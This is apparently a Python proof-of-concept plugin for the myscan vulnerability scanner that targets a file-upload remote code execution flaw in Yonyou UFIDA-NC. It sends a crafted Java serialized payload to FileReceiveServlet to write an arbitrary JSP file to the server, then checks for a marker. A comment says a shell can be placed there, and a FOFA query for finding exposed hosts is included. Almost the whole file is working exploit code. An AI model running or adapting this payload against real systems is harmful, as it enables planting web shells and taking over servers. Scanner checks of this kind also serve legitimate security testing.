# !/usr/bin/env python3
# @Time    : 2020/12/1
# @Author  : caicai
# @File    : poc_yonyou_rce_2020.py


from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set
from myscan.lib.parse.response_parser import response_parser
from myscan.lib.core.common import get_random_str
import struct, binascii

'''
fofa:
app="用友-UFIDA-NC"
'''

class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "yonyou_rce"
        self.vulmsg = "no detail,maybe 0day"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return

        uploadHeader = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
            "Content-Type": "multipart/form-data;",
            "Referer": "https://google.com"
        }
        filename = "{}.jsp".format(get_random_str(4).lower())
        uploadData = r"\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74".replace(
            r"\x", "")
        uploadData += binascii.b2a_hex(struct.pack(">H", len(filename))).decode()
        uploadData += binascii.b2a_hex(filename.encode()).decode()
        uploadData += r"\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78".replace(
            r"\x", "")

        shellFlag = get_random_str(10)  # you can put a shell in here
        uploadData += binascii.b2a_hex(shellFlag.encode()).decode()
        req = {
            "url": self.url + "servlet/FileReceiveServlet",
            "method": "POST",
            "headers": uploadHeader,
            "verify": False,
            "allow_redirects": False,
            "data": binascii.a2b_hex(uploadData.encode()),
            "timeout": 10,
        }
        r = request(**req)
        if r is not None and r.status_code == 200:
            req1 = {
                "url": self.url + filename,
                "method": "GET",
                "headers": uploadHeader,
                "verify": False,
                "allow_redirects": False,
                "timeout": 10,
            }
            r1 = request(**req1)
            if r1 is not None and shellFlag.encode() in r1.content:
                parse1 = response_parser(r)
                parse2 = response_parser(r1)
                self.result.append({
                    "name": self.name,
                    "url": self.url,
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "request1": parse1.getrequestraw(),
                        "response1": parse1.getresponseraw(),
                        "request2": parse2.getrequestraw(),
                        "response2": parse2.getresponseraw(),
                    }
                })
